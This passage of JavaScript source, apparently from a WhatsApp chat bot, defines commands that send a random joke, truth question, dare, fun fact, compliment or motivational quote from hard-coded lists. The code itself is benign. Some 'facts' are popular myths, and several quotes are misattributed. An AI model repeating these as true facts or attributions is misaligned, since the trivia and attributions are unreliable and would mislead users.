            "I couldn't figure out how to put my seatbelt on, but then I realized I was just too tight.",
            "I have a fear of speed bumps, but I am slowly getting over it.",
            "What do you call fake spaghetti? An impasta!",
            "I got a job at a bakery because I kneaded dough.",
            "Why did the golfer bring an extra pair of pants? In case he got a hole in one.",
            "I’m reading a book on anti-gravity. It’s impossible to put down.",
            "What did one wall say to the other? I'll meet you at the corner.",
            "I’ve started investing in stocks: beef, chicken, and vegetable. One day I hope to be a bouillonaire.",
            "What do you call a pile of cats? A meow-tain.",
            "How does a penguin build its house? Igloos it together.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "I couldn’t figure out how to put my seatbelt on. But then I realized I was just too tight.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "I broke my finger last week. On the other hand, I’m okay.",
            "What do you call an alligator in a vest? An investigator.",
            "What do you call a bear with no teeth? A gummy bear.",
            "I'm no good at math, but I know that one plus one equals two... unless you're doing algebra.",
            "Why don't seagulls fly over the bay? Because then they’d be bagels.",
            "I told my computer I needed a break, and it froze.",
            "I used to be a fireman, but I got burned out.",
            "I want to be a professional kleptomaniac, but I’m just stealing time.",
            "I have a joke about construction, but I’m still working on it.",
            "I got a reversible jacket for my birthday. I can’t wait to see how it turns out.",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well. She stormed off to the freezer and threw a bag of peas at me. It was a real cold shoulder.",
            "I couldn't figure out how to put my seatbelt on, but then I realized I was just too tight.",
            "I used to play piano by ear, but now I use my hands.",
            "I'm reading a book about anti-gravity, it's impossible to put down.",
            "I have a fear of speed bumps, but I’m slowly getting over them.",
            "I used to play piano by ear, but now I use my hands.",
            "What do you call a pile of cats? A meow-tain.",
            "Why don't skeletons fight each other? They don’t have the guts!",
            "I used to be a baker, but I couldn't make enough dough.",
            "How do you make a tissue dance? You put a little boogey in it!",
            "Why did the golfer bring an extra pair of pants? In case he got a hole in one.",
            "I told my computer I needed a break, and it froze.",
            "I got a job at a bakery because I kneaded dough.",
            "What did one wall say to the other? I’ll meet you at the corner.",
            "I’m reading a book on anti-gravity. It’s impossible to put down.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "What’s orange and sounds like a parrot? A carrot!",
            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "I couldn’t figure out how to put my seatbelt on. But then I realized I was just too tight.",
            "I’m no good at math, but I know that one plus one equals two… unless you're doing algebra.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "Why don’t oysters donate to charity? Because they are shellfish.",
            "I want to be a professional kleptomaniac, but I’m just stealing time.",
            "What did one wall say to the other? I'll meet you at the corner.",
            "I have a fear of speed bumps, but I am slowly getting over it.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "I told my computer I needed a break, and it froze.",
            "What do you call fake spaghetti? An impasta!",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well.",
            "I have a joke about construction, but I’m still working on it.",
            "I threw a boomerang 10 years ago and I still haven’t gotten it back.",
            "What do you call an alligator in a vest? An investigator.",
            "What do you call a bear with no teeth? A gummy bear.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "I’ve started investing in stocks: beef, chicken, and vegetable. One day I hope to be a bouillonaire.",
            "I got a job at a bakery because I kneaded dough.",
            "What’s a skeleton’s least favorite room in the house? The living room."
        ];
        await XeonBotInc.sendMessage(m.chat, {
            text: `*🤣 Joke Time! 🤣*\n\n${jokes[Math.floor(Math.random() * jokes.length)]}\n\n*Hope that made you smile! 😄*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the joke. Please try again later.');
        console.error('Joke error:', err);
    }
    break;
    case 'truth':
    try {
        // List of 100 truth questions
        const truthQuestions = [
            "What is your biggest fear?",
            "Have you ever lied to get out of trouble?",
            "What’s something you’ve never told anyone?",
            "If you could switch lives with someone for a day, who would it be?",
            "What’s the most embarrassing thing you’ve done?",
            "If you had to choose one person to be stuck with on a deserted island, who would it be?",
            "Have you ever had a crush on someone in this group?",
            "What’s the most awkward situation you’ve ever been in?",
            "If you could erase one event from your memory, what would it be?",
            "What’s one thing you regret doing in your life?",
            "What’s the last lie you told?",
            "Have you ever cheated in a relationship?",
            "What’s the most embarrassing thing that’s happened to you in public?",
            "What’s something you’ve done that your parents would disapprove of?",
            "Have you ever stolen something?",
            "What’s a secret you’ve never shared?",
            "What’s your biggest pet peeve?",
            "Who was your first crush?",
            "What’s the worst thing you’ve ever done to someone?",
            "Have you ever been in love?",
            "If you could date anyone in this group, who would it be?",
            "What’s something you’re really insecure about?",
            "What’s the worst date you’ve ever had?",
            "Have you ever had an awkward moment with someone you liked?",
            "What’s the craziest thing you’ve done for love?",
            "Have you ever had a one-night stand?",
            "What’s your worst habit?",
            "What’s your favorite physical feature about yourself?",
            "What’s your most embarrassing childhood memory?",
            "If you could live anywhere in the world, where would it be?",
            "What’s the most embarrassing thing you’ve said to someone?",
            "Have you ever cried in front of someone?",
            "What’s a secret talent you have?",
            "What’s your biggest insecurity?",
            "What’s the worst thing you’ve done at work or school?",
            "What’s the worst advice you’ve ever taken?",
            "Have you ever been caught doing something you shouldn’t?",
            "If you could be famous for something, what would it be?",
            "What’s one thing you’ve always wanted to do but never had the courage to?",
            "Have you ever broken someone’s heart?",
            "What’s the most rebellious thing you’ve done?",
            "Have you ever had a crush on a teacher?",
            "What’s the weirdest dream you’ve ever had?",
            "What’s the most awkward thing you’ve ever done to impress someone?",
            "If you could switch bodies with someone for a day, who would it be?",
            "What’s the worst mistake you’ve made in a relationship?",
            "Have you ever been in a secret relationship?",
            "What’s the worst gift you’ve ever received?",
            "What’s your biggest turn-on?",
            "Have you ever told someone you loved them without meaning it?",
            "What’s the worst job you’ve ever had?",
            "Have you ever lied on your resume?",
            "What’s something you’ve done that made you feel proud?",
            "Have you ever ghosted someone?",
            "What’s the biggest lie you’ve ever told?",
            "What’s one thing you would change about yourself?",
            "If you could have one wish right now, what would it be?",
            "Have you ever been in a physical fight?",
            "What’s the most embarrassing thing that happened to you in school?",
            "What’s something you’ve never told anyone about your childhood?",
            "What’s something you’ve done that your friends don’t know about?",
            "What’s your most awkward family gathering memory?",
            "What’s something you would never do even for a million dollars?",
            "Have you ever been in trouble with the law?",
            "What’s the last thing you searched for on your phone?",
            "Have you ever done something that you regretted instantly?",
            "What’s the worst thing you’ve done at a party?",
            "What’s something you hate about yourself?",
            "Have you ever betrayed a friend?",
            "What’s the weirdest thing you’ve ever eaten?",
            "What’s the most embarrassing thing you’ve done on a date?",
            "If you could change one thing about your personality, what would it be?",
            "Have you ever had a crush on someone you shouldn’t?",
            "What’s something you’ve done that you’d never admit to anyone?",
            "What’s the worst advice you’ve ever given?",
            "What’s the most awkward thing you’ve done in a job interview?",
            "Have you ever been caught cheating on a test?",
            "What’s the most embarrassing thing you’ve done on social media?",
            "What’s the worst thing you’ve done for money?",
            "Have you ever been attracted to someone’s partner?",
            "What’s the craziest thing you’ve ever done on a dare?",
            "Have you ever been rejected by someone you liked?",
            "What’s the worst breakup you’ve ever had?",
            "What’s the worst decision you’ve made in the past year?",
            "Have you ever lied to your best friend?",
            "What’s the most embarrassing thing you’ve done while drunk?",
            "What’s something you’ve done to avoid confrontation?",
            "Have you ever been caught sneaking out?",
            "What’s the worst thing you’ve done in the name of revenge?",
            "Have you ever done something you’re ashamed of in public?",
            "What’s something you’ve been hiding from your family?",
            "What’s the most embarrassing thing you’ve done at work?",
            "Have you ever taken a risk that didn’t pay off?",
            "What’s something you’ve done that you’re proud of but never told anyone?",
            "What’s the weirdest thing you’ve found on the internet?",
            "What’s the most embarrassing text you’ve sent?",
            "What’s the last thing you lied about?",
            "What’s the worst job interview you’ve ever had?",
            "Have you ever been in an awkward situation with someone you didn’t know well?",
            "What’s your most embarrassing online moment?",
            "What’s the most embarrassing thing you’ve done in front of your crush?",
            "What’s your biggest regret in life?",
            "Have you ever made a prank call?",
            "What’s your most embarrassing family moment?",
            "Have you ever been in love with someone who didn’t love you back?"
        ];

        // Send a random truth question directly to the user
        await XeonBotInc.sendMessage(m.chat, {
            text: `*😳 Truth Time! 😳*\n\n${truthQuestions[Math.floor(Math.random() * truthQuestions.length)]}\n\n*Your turn to be honest! 😅*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the truth question. Please try again later.');
        console.error('Truth error:', err);
    }
    break;
    case 'dare':
    try {
        // List of 100 dare challenges
        const dareChallenges = [
            "I dare you to send a funny selfie to the group.",
            "I dare you to try to sing a song and send the voice note.",
            "I dare you to do 10 push-ups and send a video of it.",
            "I dare you to post a random emoji in the chat and leave it there for 10 minutes.",
            "I dare you to tell a funny joke to the group right now.",
            "I dare you to make a funny face and send a photo of it.",
            "I dare you to send a message in a completely different accent for the rest of the chat.",
            "I dare you to share an embarrassing childhood story.",
            "I dare you to share your last search history with the group.",
            "I dare you to send a voice note singing your favorite song.",
            "I dare you to write a funny poem about someone in the group.",
            "I dare you to try a dance move and record it.",
            "I dare you to pretend to be a celebrity for the next 10 minutes.",
            "I dare you to tell the funniest joke you know.",
            "I dare you to post a random video of you dancing to any song.",
            "I dare you to share a weird secret talent you have.",
            "I dare you to make a prank call to someone in the group.",
            "I dare you to try to talk in rhyme for the next 5 minutes.",
            "I dare you to share an embarrassing story from your teenage years.",
            "I dare you to tell the group an embarrassing fact about yourself.",
            "I dare you to do your best impression of someone in the group.",
            "I dare you to act like a robot for the next 5 minutes.",
            "I dare you to do 20 jumping jacks on camera.",
            "I dare you to speak only in questions for the next 5 minutes.",
            "I dare you to share a weird food combination you like.",
            "I dare you to send a voice note singing the alphabet.",
            "I dare you to make a funny face and keep it for 30 seconds.",
            "I dare you to send a video of you making an unusual sound.",
            "I dare you to pretend you are a character from a movie for 5 minutes.",
            "I dare you to do an impression of someone famous and send a video.",
            "I dare you to wear something ridiculous and send a photo of yourself.",
            "I dare you to try a random dance challenge from TikTok.",
            "I dare you to change your profile picture to something funny for 24 hours.",
            "I dare you to post a video of you attempting a backflip.",
            "I dare you to do your best impression of an animal sound.",
            "I dare you to make a funny voice and send a voice note.",
            "I dare you to eat something spicy and record your reaction.",
            "I dare you to wear socks on your hands and take a picture.",
            "I dare you to sing a random song loudly in your room and send a video.",
            "I dare you to draw a silly doodle and share it with the group.",
            "I dare you to take a 10-second video of you jumping up and down.",
            "I dare you to make up a silly song and sing it for the group.",
            "I dare you to act like a famous celebrity for the next 10 minutes.",
            "I dare you to wear your clothes backward for the next hour.",
            "I dare you to take a picture of your messy room and share it.",
            "I dare you to do a cartwheel and record it.",
            "I dare you to try to say the alphabet backwards.",
            "I dare you to put your favorite item of clothing on your head and take a picture.",
            "I dare you to send a video of you eating something sour.",
            "I dare you to post a video of you trying to imitate an animal's walk.",
            "I dare you to send a video of you lip-syncing to a song.",
            "I dare you to dance like a robot for one minute.",
            "I dare you to write a funny tweet and share it on social media.",
            "I dare you to record yourself eating a spoonful of peanut butter.",
            "I dare you to do a slow-motion video of you jumping in the air.",
            "I dare you to try to juggle three objects and film yourself.",
            "I dare you to sing a love song in a funny voice.",
            "I dare you to talk in rhyme for the next five messages.",
            "I dare you to take a photo of your reaction to seeing an animal on TV.",
            "I dare you to put on sunglasses and walk around your house like you're famous.",
            "I dare you to say a tongue twister five times fast without making a mistake.",
            "I dare you to create a new handshake with someone and record it.",
            "I dare you to try to touch your toes while standing for one minute.",
            "I dare you to send a voice message singing the chorus of your favorite song.",
            "I dare you to make a TikTok video of you doing a silly challenge.",
            "I dare you to send a video of you pretending to be a superhero.",
            "I dare you to take a silly selfie with a random object.",
            "I dare you to send a video of you trying to jump rope for one minute.",
            "I dare you to try to walk like a penguin for 30 seconds.",
            "I dare you to try to mimic the sound of a duck.",
            "I dare you to talk to a random person and try to make them laugh.",
            "I dare you to post a funny meme on your story.",
            "I dare you to send a video of you trying a new hairstyle.",
            "I dare you to create a funny, short skit and send it to the group.",
            "I dare you to record yourself acting out a scene from a movie.",
            "I dare you to put on the most ridiculous outfit you have and take a picture.",
            "I dare you to make a funny video and try to get everyone to laugh.",
            "I dare you to share a funny story that happened to you recently.",
            "I dare you to do a dramatic reading of a children’s book.",
            "I dare you to attempt a yoga pose and send a photo.",
            "I dare you to make a short video of you doing your best runway walk.",
            "I dare you to send a voice note singing any song with enthusiasm.",
            "I dare you to record yourself doing a funny dance move.",
            "I dare you to put your clothes on inside out and take a picture.",
            "I dare you to try to make a sandwich blindfolded and send a video of it.",
            "I dare you to act like you're on a cooking show and demonstrate making a simple snack.",
            "I dare you to do 20 sit-ups in a row and record it.",
            "I dare you to talk in a funny accent for the next 10 minutes.",
            "I dare you to write a poem about someone in the group.",
            "I dare you to create a funny TikTok dance and share it.",
            "I dare you to do a dramatic reading of the lyrics to a pop song.",
            "I dare you to send a voice note singing the first verse of your favorite song.",
            "I dare you to wear your clothes in a crazy combination for the next hour.",
            "I dare you to try to do a split and send a video.",
            "I dare you to make up a silly nickname for yourself and introduce yourself with it.",
            "I dare you to send a video of you making a funny face.",
            "I dare you to try a random food combination and film your reaction.",
            "I dare you to take a 5-second video of you jumping around like a kangaroo.",
            "I dare you to act like a famous cartoon character for the next 5 minutes.",
            "I dare you to imitate a famous celebrity’s voice and send a voice note.",
            "I dare you to wear socks on your hands for the next 15 minutes.",
            "I dare you to tell a really cheesy joke to the group.",
            "I dare you to wear a ridiculous wig and take a picture.",
            "I dare you to try to balance an object on your head for one minute."
        ];

        // Send a random dare challenge directly to the user
        await XeonBotInc.sendMessage(m.chat, {
            text: `*😜 Dare Time! 😜*\n\n${dareChallenges[Math.floor(Math.random() * dareChallenges.length)]}\n\n*Are you up for it?*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the dare challenge. Please try again later.');
        console.error('Dare error:', err);
    }
    break;
    case 'fact':
    try {
        // List of 100 random facts
        const facts = [
            "Bananas are berries, but strawberries aren’t.",
            "A group of flamingos is called a 'flamboyance.'",
            "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly edible.",
            "Octopuses have three hearts and blue blood.",
            "The Eiffel Tower can be 15 cm taller during the summer due to the expansion of metal in heat.",
            "Wombat poop is cube-shaped.",
            "The shortest commercial flight in the world is between two Scottish islands and lasts only 57 seconds.",
            "A day on Venus is longer than a year on Venus.",
            "Cleopatra lived closer in time to the moon landing than to the construction of the Great Pyramid of Giza.",
            "The longest hiccuping spree lasted 68 years.",
            "You can't hum while holding your nose.",
            "The inventor of the Pringles can is buried in one.",
            "Sharks existed before trees.",
            "Cows have best friends and can become stressed when separated from them.",
            "A single cloud can weigh more than a million pounds.",
            "Bamboo can grow up to 35 inches in a single day.",
            "The heart of a blue whale is the size of a small car.",
            "There are more stars in the universe than grains of sand on all the Earth’s beaches.",
            "A bolt of lightning is five times hotter than the surface of the sun.",
            "Sloths can hold their breath for up to 40 minutes underwater.",
            "The unicorn is Scotland’s national animal.",
            "Polar bear skin is black, although their fur appears white.",
            "Apples are more effective at waking you up in the morning than coffee.",
            "The shortest war in history lasted 38 to 45 minutes between Britain and Zanzibar in 1896.",
            "Hawaii moves 7.5cm closer to Japan every year.",
            "Cows can walk upstairs, but they can’t walk down.",
            "In space, astronauts cannot cry because there is no gravity to make the tears flow.",
            "Venus is the hottest planet in our solar system, even though Mercury is the closest to the Sun.",
            "A crocodile cannot stick its tongue out.",
            "The longest time between two twins being born is 87 days.",
            "Koalas sleep up to 22 hours a day.",
            "Dolphins have names for each other and can call out to each other.",
            "The Great Wall of China is not visible from space with the naked eye.",
            "Banging your head against a wall for one hour burns 150 calories.",
            "The Eiffel Tower can be 15 cm taller during the summer.",
            "An astronaut's height can change by up to 2 inches in space.",
            "The first person to go to space was Yuri Gagarin from the Soviet Union in 1961.",
            "Sharks can live for up to 400 years.",
            "There are no naturally occurring blue foods.",
            "The world’s oldest piece of chewing gum is over 9,000 years old.",
            "Mount Everest grows by about 4 millimeters every year.",
            "A jellyfish is 95% water.",
            "The average person walks the equivalent of three times around the world in a lifetime.",
            "One teaspoon of honey represents the life work of 12 bees.",
            "There are more trees on Earth than there are stars in the Milky Way.",
            "The word 'nerd' was first coined by Dr. Seuss in *If I Ran the Zoo*.",
            "There is a species of jellyfish that is biologically immortal.",
            "A day on Mercury is twice as long as a year on Mercury.",
            "Cheetahs are the fastest land animals and can run up to 60 mph.",
            "A blue whale’s tongue can weigh as much as an elephant.",
            "The first video ever uploaded to YouTube was titled 'Me at the zoo.'",
            "The longest hiccuping spree lasted 68 years.",
            "An ostrich’s eye is bigger than its brain.",
            "A group of owls is called a parliament.",
            "A snail can sleep for three years.",
            "Peanuts are not nuts; they are legumes.",
            "Sloths can take up to a month to digest their food.",
            "There are more fake flamingos in the world than real ones.",
            "The longest place name in the world is in New Zealand and has 85 characters.",
            "A giraffe's neck contains the same number of vertebrae as a human’s neck.",
            "The unicorn is Scotland’s national animal.",
            "An octopus has three hearts and blue blood.",
            "A sneeze can travel as fast as 100 miles per hour.",
            "The human nose can distinguish at least 1 trillion different scents.",
            "There’s a species of fungus called *'Zombie fungus'* that can take control of ants' bodies.",
            "A shrimp's heart is located in its head.",
            "In Japan, there’s a museum dedicated entirely to Ramen noodles.",
            "The longest hiccuping spree lasted for 68 years.",
            "A panda's diet consists of 99% bamboo.",
            "The most commonly used letter in the English language is 'e'.",
            "Bananas are naturally radioactive.",
            "Honey never spoils.",
            "There’s a species of jellyfish that can revert to its youthful state after adulthood.",
            "Venus is the hottest planet in the solar system.",
            "Elephants can hear through their feet.",
            "Astronauts' height changes in space due to the absence of gravity.",
            "A duck's quack doesn't echo.",
            "The longest wedding veil was longer than 63 football fields.",
            "A day on Neptune lasts 16 hours.",
            "The Eiffel Tower was originally intended to be a temporary structure.",
            "Cats have 32 muscles in each ear.",
            "The longest recorded time without sleep is 11 days.",
            "The shortest war in history was between Britain and Zanzibar, lasting only 38 minutes.",
            "There are no words in the dictionary that rhyme with 'orange.'",
            "A day on Mars is only 40 minutes longer than a day on Earth.",
            "The sound of a whip cracking is faster than the speed of sound.",
            "A leap year has 366 days instead of 365.",
            "A sneeze can travel at speeds of up to 100 miles per hour.",
            "One light-year is about 5.88 trillion miles.",
            "A giraffe’s tongue is about 18 inches long.",
            "The human eye can distinguish about 10 million different colors.",
            "A snail can sleep for three years.",
            "The strongest muscle in the human body is the masseter (jaw muscle).",
            "The world’s largest desert is the Antarctic Desert.",
            "You can’t hum while holding your nose.",
            "The longest hiccuping spree lasted for 68 years.",
            "Polar bears have black skin beneath their white fur.",
            "The largest snowflake ever recorded was 15 inches wide.",
            "The moon is moving away from the Earth by about 1.5 inches each year.",
            "The world’s smallest mammal is the bumblebee bat.",
            "The first recorded Olympic Games were held in 776 BC in Greece.",
            "An octopus can change its color to blend into its surroundings.",
            "A frog can freeze itself in winter and thaw out in the spring.",
            "The longest time someone has gone without eating is 382 days.",
            "Caffeine is the most widely used psychoactive drug in the world.",
            "The longest time anyone has held their breath underwater is 24 minutes.",
            "A panda’s thumb is actually an extended wrist bone.",
            "The largest living organism in the world is a fungus in Oregon, covering 2,385 acres."
        ];

        // Send a random fact directly to the user
        await XeonBotInc.sendMessage(m.chat, {
            text: `*🤯 Fun Fact Time! 🤯*\n\n${facts[Math.floor(Math.random() * facts.length)]}\n\n*Did you learn something new? 🤓*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the fact. Please try again later.');
        console.error('Fact error:', err);
    }
    break;
    case 'compliment':
    try {
        const compliments = [
            "You're an amazing person, inside and out!",
            "You have such a beautiful soul!",
            "Your smile is contagious!",
            "You're so smart and creative!",
            "You light up the room whenever you walk in!",
            "You're an absolute joy to be around!",
            "Your energy is so positive!",
            "You're doing great things, keep it up!",
            "You have a heart of gold!",
            "Your kindness makes the world a better place!",
            "You make everything seem so easy!",
            "You're a true inspiration!",
            "The world needs more people like you!",
            "Your laugh is the best sound ever!",
            "You're a natural at everything you do!",
            "You radiate positivity and joy!",
            "You're a shining star!",
            "You have an incredible ability to make people feel good!",
            "Your creativity knows no bounds!",
            "You are a one-of-a-kind gem!",
            "You're an amazing listener!",
            "You have such an infectious enthusiasm!",
            "You're always so thoughtful and considerate!",
            "You're a beautiful person, inside and out!",
            "You have a gift for making everyone feel special!",
            "You're a master at everything you do!",
            "Your personality lights up every room!",
            "You're a true friend and a loyal companion!",
            "You're always so brave and courageous!",
            "You have such a unique and special perspective!",
            "You're one of a kind, and that's awesome!",
            "Your sense of humor is absolutely amazing!",
            "You're such a positive influence on everyone around you!",
            "You're full of incredible ideas!",
            "You have such an infectious energy!",
            "You're a dream to work with!",
            "You have a special way of making others feel at ease!",
            "You're truly a ray of sunshine!",
            "Your intelligence is so impressive!",
            "You're an inspiration to those around you!",
            "You make life so much better just by being in it!",
            "You have such an amazing work ethic!",
            "You brighten up everyone's day!",
            "You're such a hard worker, and it shows!",
            "You're an absolute star in everything you do!",
            "You have the most beautiful heart!",
            "You always know how to make people smile!",
            "You're such a thoughtful and caring person!",
            "You're a great role model!",
            "You have a unique and beautiful perspective on life!",
            "You always brighten up the room with your presence!",
            "You're someone who everyone loves being around!",
            "You have an incredible ability to make others feel special!",
            "You're a true visionary!",
            "Your wisdom is beyond your years!",
            "You're always so encouraging and uplifting!",
            "You're always so patient and understanding!",
            "You have such a beautiful, positive spirit!",
            "You inspire others to be the best version of themselves!",
            "You're so passionate about everything you do!",
            "Your energy is absolutely magnetic!",
            "You're such a great team player!",
            "You make the world a better place just by being you!",
            "Your presence makes everything better!",
            "You are so genuinely kind and caring!",
            "You're such an incredible problem solver!",
            "You're an amazing motivator!",
            "You have such a beautiful mind!",
            "You're so generous with your time and energy!",
            "You have a great sense of style!",
            "You're an absolute joy to be around!",
            "You make everyone feel so comfortable!",
            "You're always so supportive and encouraging!",
            "You're a true leader in every sense of the word!",
            "You're someone that people admire and look up to!",
            "You have such a big heart!",
            "You're always so thoughtful and kind-hearted!",
            "You're truly a gem in this world!",
            "You have a way of making everyone feel important!",
            "You bring so much joy to those around you!",
            "You have a fantastic sense of humor!",
            "You're a natural at making people feel valued!",
            "You're such a great friend!",
            "You have such an amazing soul!",
            "You bring so much positivity into the world!",
            "You're such a great listener and friend!",
            "You have a heart that’s always open to others!",
            "You make every day brighter just by being you!",
            "You have the most wonderful energy!",
            "You make everyone feel so welcome!",
            "You're an amazing person to have around!",
            "You're such a wonderful spirit!",
            "You're always so kind and generous!",
            "You have an incredible ability to make others feel comfortable!",
            "You're a true gem!",
            "You're so kind-hearted and generous!",
            "You're truly one of a kind!",
            "You're the kind of person who makes the world a better place!",
            "You're amazing just the way you are!",
            "You're full of incredible potential!",
            "You have such a magnetic personality!",
            "You're a treasure to be around!",
            "You're always so friendly and approachable!",
            "You make the world more beautiful just by being in it!",
            "You're an absolute gem of a person!",
            "You're always so full of life!",
            "You brighten everyone's day just by being yourself!",
            "You're truly one of the most remarkable people I know!"
        ];

        await XeonBotInc.sendMessage(m.chat, {
            text: `*💖 Compliment Time! 💖*\n\n${compliments[Math.floor(Math.random() * compliments.length)]}`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the compliment. Please try again later.');
        console.error('Compliment error:', err);
    }
    break;
    case 'quote':
    try {
        const quotes = [
            "The only way to do great work is to love what you do. – Steve Jobs",
            "Success is not the key to happiness. Happiness is the key to success. – Albert Schweitzer",
            "Don't watch the clock; do what it does. Keep going. – Sam Levenson",
            "The best way to predict the future is to create it. – Abraham Lincoln",
            "Believe you can and you're halfway there. – Theodore Roosevelt",
            "In the middle of every difficulty lies opportunity. – Albert Einstein",
            "What lies behind us and what lies before us are tiny matters compared to what lies within us. – Ralph Waldo Emerson",
            "Do not wait to strike till the iron is hot, but make it hot by striking. – William Butler Yeats",
            "It does not matter how slowly you go as long as you do not stop. – Confucius",
            "The future belongs to those who believe in the beauty of their dreams. – Eleanor Roosevelt",
            "The only way to achieve the impossible is to believe it is possible. – Charles Kingsleigh",
            "Act as if what you do makes a difference. It does. – William James",
            "Success is not final, failure is not fatal: It is the courage to continue that counts. – Winston Churchill",
            "It always seems impossible until it's done. – Nelson Mandela",
            "You miss 100% of the shots you don't take. – Wayne Gretzky",
            "Everything you can imagine is real. – Pablo Picasso",
            "Life is 10% what happens to us and 90% how we react to it. – Charles R. Swindoll",
            "Don’t wait. The time will never be just right. – Napoleon Hill",
            "Your time is limited, so don’t waste it living someone else’s life. – Steve Jobs",
            "To be yourself in a world that is constantly trying to make you something else is the greatest accomplishment. – Ralph Waldo Emerson",
            "The only limit to our realization of tomorrow is our doubts of today. – Franklin D. Roosevelt",
            "Happiness is not something ready-made. It comes from your own actions. – Dalai Lama",
            "The pessimist sees difficulty in every opportunity. The optimist sees opportunity in every difficulty. – Winston Churchill",
            "Do what you can with all you have, wherever you are. – Theodore Roosevelt",
            "It is never too late to be what you might have been. – George Eliot",
            "A journey of a thousand miles begins with a single step. – Lao Tzu",
            "You must be the change you wish to see in the world. – Mahatma Gandhi",
            "Your life does not get better by chance, it gets better by change. – Jim Rohn",
            "We do not remember days, we remember moments. – Cesare Pavese",
            "The harder you work for something, the greater you’ll feel when you achieve it. – Unknown",
            "Dream big and dare to fail. – Norman Vaughan",
            "Don't be afraid to give up the good to go for the great. – John D. Rockefeller",
            "Success is walking from failure to failure with no loss of enthusiasm. – Winston Churchill",
            "Don't watch the clock; do what it does. Keep going. – Sam Levenson",
            "You don’t have to be great to start, but you have to start to be great. – Zig Ziglar",
            "The only way to do great work is to love what you do. – Steve Jobs",
            "If you can dream it, you can do it. – Walt Disney",
            "Everything you can imagine is real. – Pablo Picasso",
            "Life is either a daring adventure or nothing at all. – Helen Keller",
            "The best way to predict the future is to invent it. – Alan Kay",
            "You are never too old to set another goal or to dream a new dream. – C.S. Lewis",
            "I find that the harder I work, the more luck I seem to have. – Thomas Jefferson",
            "Success usually comes to those who are too busy to be looking for it. – Henry David Thoreau",
            "The only person you are destined to become is the person you decide to be. – Ralph Waldo Emerson",
            "You only live once, but if you do it right, once is enough. – Mae West",
            "Success is the sum of small efforts, repeated day in and day out. – Robert Collier",
            "Everything has beauty, but not everyone can see it. – Confucius",
            "To be great is to be misunderstood. – Ralph Waldo Emerson",
            "In the end, we will remember not the words of our enemies, but the silence of our friends. – Martin Luther King Jr.",
            "The journey of a thousand miles begins with one step. – Lao Tzu",
            "Live as if you were to die tomorrow. Learn as if you were to live forever. – Mahatma Gandhi",
            "It does not matter how slowly you go, as long as you do not stop. – Confucius",
            "What you get by achieving your goals is not as important as what you become by achieving your goals. – Zig Ziglar",
            "Believe you can and you're halfway there. – Theodore Roosevelt",
            "The only thing standing between you and your goal is the story you keep telling yourself as to why you can’t achieve it. – Jordan Belfort",
            "It’s not whether you get knocked down, it’s whether you get up. – Vince Lombardi",
            "You are braver than you believe, stronger than you seem, and smarter than you think. – A.A. Milne",
            "Success is not in what you have, but who you are. – Bo Bennett",
            "Life isn’t about finding yourself. Life is about creating yourself. – George Bernard Shaw",
            "If you want to achieve greatness stop asking for permission. – Anonymous",
            "You can't use up creativity. The more you use, the more you have. – Maya Angelou",
            "Everything you’ve ever wanted is on the other side of fear. – George Addair",
            "What we think, we become. – Buddha",
            "I am not a product of my circumstances. I am a product of my decisions. – Stephen Covey",
            "Go confidently in the direction of your dreams. Live the life you have imagined. – Henry David Thoreau",
            "The best revenge is massive success. – Frank Sinatra",
            "There are no shortcuts to any place worth going. – Beverly Sills",
            "Do what you love, and you’ll never work another day in your life. – Confucius",
            "Opportunities don't happen, you create them. – Chris Grosser",
            "The harder you work for something, the greater you’ll feel when you achieve it. – Unknown",
            "If you don’t design your own life plan, chances are you’ll fall into someone else’s plan. – Jim Rohn",
            "Everything you can imagine is real. – Pablo Picasso",
            "Success is not final, failure is not fatal: it is the courage to continue that counts. – Winston Churchill",
            "You must be the change you wish to see in the world. – Mahatma Gandhi",
            "The purpose of life is not to be happy. It is to be useful, to be honorable, to be compassionate, to have it make some difference that you have lived and lived well. – Ralph Waldo Emerson",
            "Don’t stop when you’re tired. Stop when you’re done. – Unknown",
            "Life is what happens when you’re busy making other plans. – John Lennon",
            "You can never cross the ocean until you have the courage to lose sight of the shore. – Christopher Columbus",
            "The best way to predict the future is to create it. – Peter Drucker",
            "The only impossible journey is the one you never begin. – Tony Robbins",
            "If you want to live a happy life, tie it to a goal, not to people or things. – Albert Einstein",
            "Don’t wait for the perfect moment. Take the moment and make it perfect. – Unknown",
            "Happiness depends upon ourselves. – Aristotle",
            "Everything has beauty, but not everyone can see it. – Confucius",
            "Your life does not get better by chance, it gets better by change. – Jim Rohn",
            "The journey of a thousand miles begins with a single step. – Lao Tzu",
            "Don’t let yesterday take up too much of today. – Will Rogers",
            "The secret to getting ahead is getting started. – Mark Twain",
            "Don't be pushed around by the fears in your mind. Be led by the dreams in your heart. – Roy T. Bennett",
            "Life is either a daring adventure or nothing at all. – Helen Keller"
        ];
        
        await XeonBotInc.sendMessage(m.chat, {
            text: `*💬 Quote of the Day 💬*\n\n${quotes[Math.floor(Math.random() * quotes.length)]}`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the quote. Please try again later.');
        console.error('Quote error:', err);
    }
    break;
    case 'wouldyourather':
    try {
        const wouldYouRatherQuestions = [
            "Would you rather be able to speak all languages or be able to speak to animals?",
            "Would you rather have the ability to fly or the ability to turn invisible?",
            "Would you rather have a rewind button or a pause button in your life?",
            "Would you rather always have to sing instead of speaking or dance everywhere you go?",
